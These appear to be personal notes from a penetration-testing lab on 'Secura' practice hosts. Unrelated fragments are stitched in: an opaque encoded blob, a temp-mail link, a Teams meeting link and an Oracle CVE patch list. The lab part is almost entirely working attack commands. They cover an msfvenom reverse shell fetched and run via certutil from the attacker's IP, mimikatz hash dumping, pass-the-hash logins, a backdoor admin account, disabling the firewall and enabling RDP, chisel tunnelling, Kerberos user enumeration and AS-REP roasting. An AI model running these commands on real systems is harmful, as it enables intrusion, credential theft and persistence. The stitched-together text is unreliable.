<img width="144" height="17254" alt="image" src="https://github.com/user-attachments/assets/ad3f68cf-b2ed-490e-8f0e-f8159a2c76e3" />

https://temp-mail.org/en/
Email Rate limit
![image](https://github.com/user-attachments/assets/36e0e1bf-8598-4a4e-978c-689f6b24fa2d)

A5B6GFs9S3demojceJUlXBjoKegdeFugQ2zbUsWwaPuvYAn2zh0uJq9gCfbOHS4midX9pupdJITEzi9OhATZzbzz93XtUMyN/Pf4FP13K6P0FpQjnHjrChZe+YvSNxCuFfdix4cTplJrt8ZY3NQkHEXqmagVsMBaZ0pDSpD1+M1ikpdho/wQqcPVBv3DxiejGDsj8FXLvSmT5p0BpU3XICGeRhOQvRmPR5AwMwusKpIxNrmILxLwl9vnY7iCJPFeaMckHxBLarhsSM1Y7WU4nANeUDxv5Y+3t2B0UOmICXuboN3moFYptZ/uDC85+YiOlBdOdyFIcSlXzOlIM0fmp6cIRUpA5v9MVsEN8xDKka4DoMZe70t1N/MRB//KACD/+V4QlKGrTa73mtN7JmHFBQYkvNU69HYRxrmOG8oPOangre6JTDhJaq0IC13XA2hJ+3sIKFOJiIXkYBmINITC2K584r0p1e+bhQQLgCsAXwSMGivZ/9zwXvRT9lMnBwTjQo8iS7YdD2mUqem4Nq+WwVdPPSfn2OZN7WNEpvnm3H7454A+vw9DmO2dvlzEw8cS0zMWhE7VRDi45LiggWonk/LaOQSiAPhwLFiP855i00jEr9CW8DUH6dW7sjSbm77mWPzeb8+qo948w7j5R2k2F45589ar2JI4X25IR9+XlW7BIEIk1KtXikQEO0pz/tvK7EHXAvf2XoOq8pNznRJ273P8gOu8yRE8u/6k2M6x0xQJ8U2e/v+lXA6PM2NwvoMg7G6ahiEvx715+UnmGzjXGpmQsy7VSmfDFLRTrtAM9P8h47Qsv9t06Mdqf9STrFTA8QHL60VtOv7w9ac1lUk0+wG7+XIDBl4g
![image](https://github.com/user-attachments/assets/c0e61761-aa5b-48d2-8456-1d227cffda69)

https://your-it-note.blogspot.com/2024/09/challenge-0-secura1.html

nmap --top-ports 10 -sV 192.168.163.96

┌──(kali㉿kali)-[~/lab0/95]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -b '\x00\x01\x0d' -f exe -o revershell.exe
vi cmd.bat
certutil.exe -f -urlcache -split http://192.168.45.214/lab0/95/revershell.exe c:\windows\temp\revershell.exe && cmd.exe /c c:\windows\temp\revershell.exe
sudo mkdir -p /var/www/html/lab0/95 && sudo mv revershell.exe /var/www/html/lab0/95/
sudo python2 -m SimpleHTTPServer 80
sudo nc -lvp 443 


------
C:\>dir /s local.txt //proof.txt //flag
C:\Program Files\ManageEngine\AppManager14\working> tar -xf mimikatz.zip
C:\Program Files\ManageEngine\AppManager14\working>cd "C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64" //dir also ok
C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.exe //get Username + NTLM Hash
-------
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.212.95  -u administrator -H "a51493b0b06e5e35f855245e71af1d14"


┌──(kali㉿kali)-[~/lab0/96]
└─$ mysql -h 192.168.218.96 -u root -p

powershell/lab0/95 //firewall close
C:\Program Files\ManageEngine\AppManager14\working> net user aries Oscp#1234 /add
C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators aries /add
C:\Program Files\ManageEngine\AppManager14\working> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\Program Files\ManageEngine\AppManager14\working> netsh advfirewall set allprofiles state off
C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators "SECURA\charlotte" /add

┌──(kali㉿kali)-[~]
└─$ xfreerdp -v:192.168.218.95 -u:aries -p:'Oscp#1234' +clipboard -cert:ignore -drive:aries,/home/kali/lab0/95

C:\Users\aries>netstat -ano | findstr /R "^ *TCP"
c:\>dir /s *.kbdx
c:\>dir /s *.zip 

cd C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin
""NotePad to open BackUpPSQL""

┌──(kali㉿kali)-[~/lab0/97]
└─$ ./kerbrute_linux_amd64 userenum --dc 192.168.218.97 -d secura.yzx -o kerbrute-user-enum xato-net-10-million-usernames.txt //enum
./GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.218.97 'secura.yzx/' //check ASREP



└─$ crackmapexec winrm 192.168.103.95-97 -u apache -p 'New2Era4.!' --local-auth
└─$ evil-winrm -i 192.168.103.96  -u apache -p 'New2Era4.!'        


==Chisel.exe==
┌──(kali㉿kali)-[~/lab0/96]
└─$ ./chisel.exe server -p 8000 --reverse //linux version-> then upload windows version to http server


*Evil-WinRM* PS C:\Users\apache.ERA\Documents> Invoke-WebRequest -Uri http://192.168.45.214:80/lab0/96/chisel_windows.exe -OutFile C:\Users\apache.ERA\Documents\chisel_windows.exe
*Evil-WinRM* PS C:\Users\apache.ERA\Documents> .\chisel_windows.exe client 192.168.45.214:8000 R:3306:127.0.0.1:3306


┌──(kali㉿kali)-[~]
└─$ sudo neo4j console
//Open your web browser and navigate to http://localhost:7474. Log in with the default credentials (neo4j/neo4j) and change the password when prompted.
//neo4j://localhost:7687

┌──(kali㉿kali)-[~]
└─$ bloodhound

┌──(kali㉿kali)-[~/lab0/96] (install bloodhound.exe first)
└─$ bloodhound-python -u 'charlotte' -p 'Game2On4.!' -ns 192.168.105.97 -d secura.yzx -c All --dns-timeout 15

Start node: CHARLOTTE@SECURA.YZX
Target node: DEFAULT DOMAIN POLICY@SECURA.YZX

┌──(kali㉿kali)-[~/lab0/96]
└─$ wget https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
unzip StandIn_v13_Net35_45.zip

https://teams.microsoft.com/l/meetup-join/19%3ameeting_YzRiZjFhODUtYzVhMi00YjJjLTk3NzItZjhkODE1MWEwNjNj%40thread.v2/0?context=%7b%22Tid%22%3a%22513294a0-3e20-41b2-a970-6d30bf1546fa%22%2c%22Oid%22%3a%22031e8033-4604-4cf6-a162-73be85389a62%22%7d



The following CVEs have published proof‑of‑concept (PoC) exploits according to GovCERT information, and the corresponding Oracle patches are recommended to be prioritized.
CVE-2022-45688 – Affects Oracle Siebel CRM 17.0–25.11
CVE-2023-1436 – Affects Oracle Siebel CRM Integration (REST/Jettison) 17.0–26.2
CVE-2023-34453 – Affects Oracle Communications Cloud Native Core Network Exposure Function 24.2.1
CVE-2023-46750 – Affects Oracle Adapter for Eclipse RDF4J 24.1.0
CVE-2024-6387 – Affects Sun ZFS Storage Appliance Kit 8.8
CVE-2024-29371 – Affects Oracle Siebel CRM Integration (Event Publish and Subscribe) 17.0–26.2
CVE-2024-31573 – Affects Oracle SOA Suite (Fabric Layer / xmlunit) 12.2.1.4.0, 14.1.2.0.0
CVE-2025-0725 – Affects Oracle Access Manager 14.1.2.0.0
CVE-2025-15467 – Affects Multiple Oracle products, including:

Oracle Database Server
Oracle Autonomous Health Framework
Oracle Communications Cloud Native Core
Oracle Business Intelligence Enterprise Edition
Oracle MySQL (Server, Workbench, Enterprise Backup)
PeopleSoft Enterprise PeopleTools
(Versions vary by product; see Oracle April 2026 CPU risk matrices)

CVE-2025-24970 – Affects Oracle Business Intelligence Enterprise Edition (Analytics Server / Netty) 8.2.0.0.0
CVE-2025-26791 – Affects Oracle Communications Cloud Native Core NF Cloud Native Environment 25.1.200, 25.2.200
CVE-2025-27636 – Affects Oracle Banking Virtual Account Management (Apache Camel) 14.5.0.0.0–14.8.0.0.0
CVE-2025-35036 – Affects Oracle Middleware Common Libraries and Tools 12.2.1.4.0, 14.1.2.0.0
CVE-2025-53864 – Affects Oracle Data Integrator (Nimbus JOSE+JWT) 12.2.1.4.0, 14.1.2.0.0
CVE-2025-54571 – Affects Oracle Hyperion Infrastructure Technology 11.2.24.0.000
CVE-2025-58050 – Affects Oracle Communications Operations Monitor (PCRE2) 5.2, 6.0
CVE-2025-58057 – Affects Multiple Oracle Communications Cloud Native Core components (25.1.x–25.2.x, varies by module)
CVE-2025-58754 – Affects PeopleSoft Enterprise CC Common Application Objects 9.2
CVE-2025-59419 – Affects Oracle Business Intelligence Enterprise Edition (netty‑codec‑smtp) 8.2.0.0.0
CVE-2025-61984 – Affects Oracle Communications Policy Management 15.0.0.0.0
CVE-2025-65018 – Affects Oracle Hyperion Infrastructure Technology (libpng) 11.2.24.0.000
CVE-2025-67735 – Affects Oracle GoldenGate Big Data and Application Adapters (Netty) 21.3–21.20, 23.4–23.10
CVE-2025-68973 – Affects Oracle Communications Cloud Native Core (GnuPG) 25.1.201
CVE-2026-0861 – Affects Oracle Communications Cloud Native Core & Unified Inventory Management (glibc)

Cloud Native Core: 25.1.200, 25.2.200
Unified Inventory Management: 7.7.0–8.0.0

CVE-2026-21452 – Affects Oracle Communications Cloud Native Core Policy (MessagePack) 25.1.200
CVE-2026-22184 – Affects Oracle Outside In Technology (zlib) 8.5.8
CVE-2026-23490 – Affects Oracle Communications Cloud Native Core Policy (pyasn1) 25.1.202
CVE-2026-25646 – Affects Oracle Communications Policy Management (libpng) 15.0.0.0.0
CVE-2026-27727 – Affects Oracle Business Intelligence Enterprise Edition (Mchange Commons Java) 7.6.0.0.0, 8.2.0.0.0
CVE-2026-27830 – Affects Oracle Business Intelligence Enterprise Edition (c3p0) 7.6.0.0.0, 8.2.0.0.0
CVE-2026-33870 – Affects Oracle Database Clusterware (Micronaut) 19.3–19.30, 23.4.0–23.26.1
